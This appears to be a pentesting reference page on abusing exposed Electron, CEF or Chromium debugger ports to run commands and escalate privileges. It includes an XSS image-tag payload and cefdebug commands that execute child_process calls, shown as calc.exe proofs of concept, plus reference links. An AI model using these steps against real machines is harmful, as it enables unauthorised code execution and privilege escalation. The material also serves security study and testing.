# electron/CEF/chromium debugger abuse

If you find any process with **electron, cef or chromium debugger running** and listening to a port you should try to make the **debugger execute arbitrary commands**.  
Abusing this behaviour you **could be able to escalate privileges**.

The abuse of this vulnerability remotely could be as easy as injecting via XSS this line of JS:

```markup
<img src="http://localhost:40000/json/new/?javascript:require('child_process').spawnSync('calc.exe')">
```

But obviously the exploitation will be **much easier locally**, as you can use a tool such as: [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug)\*\*\*\*

```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```

List of resources to pwn electorn apps: [https://github.com/doyensec/awesome-electronjs-hacking](https://github.com/doyensec/awesome-electronjs-hacking)

## References

* [https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
* [https://github.com/taviso/cefdebug](https://github.com/taviso/cefdebug)
* [https://iwantmore.pizza/posts/cve-2019-1414.html](https://iwantmore.pizza/posts/cve-2019-1414.html)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=773](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=1742](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=1944](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)

